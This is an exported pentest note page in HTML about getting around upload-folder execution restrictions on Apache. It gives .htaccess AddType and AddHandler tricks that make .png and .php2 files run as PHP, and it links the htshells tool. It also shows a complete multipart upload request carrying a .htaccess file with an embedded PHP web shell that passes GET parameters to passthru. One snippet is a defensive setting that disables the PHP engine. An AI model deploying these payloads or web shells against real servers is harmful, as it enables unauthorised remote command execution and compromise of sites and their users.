<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Execution disabled on the Web Server</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Execution disabled on the Web Server</h1><br /><br />If we have the ability to upload files on the
    Web Server, we can try to re-enable execution of PHP file by:<br /><br />• put .htaccess in your upload folder
    <br /> ◇ with this(BETTER):<br />
    <div class="codebox">
      <div class="codebox">
        AddType&nbsp;application/x-httpd-php&nbsp;.php16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Say&nbsp;all&nbsp;file&nbsp;with&nbsp;extension&nbsp;.php16&nbsp;will&nbsp;execute&nbsp;php
      </div>
    </div><br /> Note: this attack relies on the following <span style="text-decoration:underline;">options being
      enabled on the Web Server</span> (NGINX does not support .htaccess files, Apache yes)<br />
    <div class="codebox">
      <div class="codebox">
        /etc/apache2/apache2.conf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AllowOverride&nbsp;Options<br />/etc/apache2/apache2.conf:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AllowOverride&nbsp;FileInfo
      </div>
    </div><br /> source: <a
      href="https://thibaud-robin.fr/articles/bypass-filter-upload/" target="_blank">https://thibaud-robin.fr/articles/bypass-filter-upload/</a><br />
    ◇ or :<br />
    <div class="codebox">
      <div class="codebox">
        &lt;IfModule&nbsp;mod_php5.c&gt;<br />&nbsp;&nbsp;php_flag&nbsp;engine&nbsp;off<br />&lt;/IfModule&gt;<br />&lt;IfModule&nbsp;mod_php7.c&gt;<br />&nbsp;&nbsp;php_flag&nbsp;engine&nbsp;off<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/IfModule<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> source: <a
      href="https://www.drupal.org/project/drupal/issues/2820611" target="_blank">https://www.drupal.org/project/drupal/issues/2820611</a><br />
    <br /><br /><strong>
      <h3>HtShells</h3>
    </strong><br /><a
      href="https://github.com/wireghoul/htshells" target="_blank">https://github.com/wireghoul/htshells</a><br /><br />Upload the file
    .htaccess and at the same time we will have a Web Shell( we could not ave access to the file .htaccess)<br />
    <div class="codebox">
      <div class="codebox">./prepare.sh&nbsp;shell/mod_php.shell.htaccess</div>
    </div><br /><br />
    <div class="codebox">
      <div class="codebox">
        Content-Disposition:&nbsp;form-data;&nbsp;name=&quot;fileToUpload&quot;;&nbsp;filename=&quot;.htaccess&quot;<br />Content-Type:&nbsp;application/octet-stream<br /><br />&lt;Files&nbsp;~&nbsp;&quot;^\.ht&quot;&gt;<br />#&nbsp;Require&nbsp;all&nbsp;granted<br />&nbsp;&nbsp;&nbsp;&nbsp;Order&nbsp;allow,deny<br />&nbsp;&nbsp;&nbsp;&nbsp;Allow&nbsp;from&nbsp;all<br />&lt;/Files&gt;<br />AddType&nbsp;application/x-httpd-php&nbsp;.php2<br />AddType&nbsp;application/x-httpd-php&nbsp;.png<br />AddType&nbsp;application/x-httpd-php&nbsp;.htaccess<br />######&nbsp;SHELL&nbsp;######&nbsp;&lt;?php&nbsp;echo&nbsp;&quot;--&gt;&lt;form&nbsp;method=&#39;get&#39;&gt;&lt;input&nbsp;type=&#39;text&#39;&nbsp;name=&#39;c&#39;&nbsp;value=&#39;&quot;.$_GET[&#39;c&#39;].&quot;&#39;&gt;&lt;input&nbsp;type=&#39;submit&#39;&nbsp;name=&#39;go&#39;&nbsp;value=&#39;Go!&#39;&gt;&lt;/form&gt;\n&lt;pre&gt;&quot;;passthru($_GET[&#39;c&#39;].&quot;&nbsp;2&gt;&amp;1&quot;);echo&nbsp;&quot;&lt;/pre&gt;&quot;;&nbsp;?&gt;
      </div>
    </div><br /> <a href=""><img src="images/1990-1.png" alt="images/1990-1.png" /></a><br /> <a href=""><img
        src="images/1990-2.png" alt="images/1990-2.png" /></a><br /><br /><strong>.htaccess</strong><br />
    <div class="codebox">
      <div class="codebox">
        AddType&nbsp;application/x-httpd-php&nbsp;.php&nbsp;.php2&nbsp;.php3&nbsp;.phtml&nbsp;.php5&nbsp;.png&nbsp;.gif<br />AddHandler&nbsp;php5-script&nbsp;php
      </div>
    </div><br />With “AddHandler php5-script php” When the php keyword appears in the file name, the contents of the
    file will be executed by the code
  </div>
</body>

</html>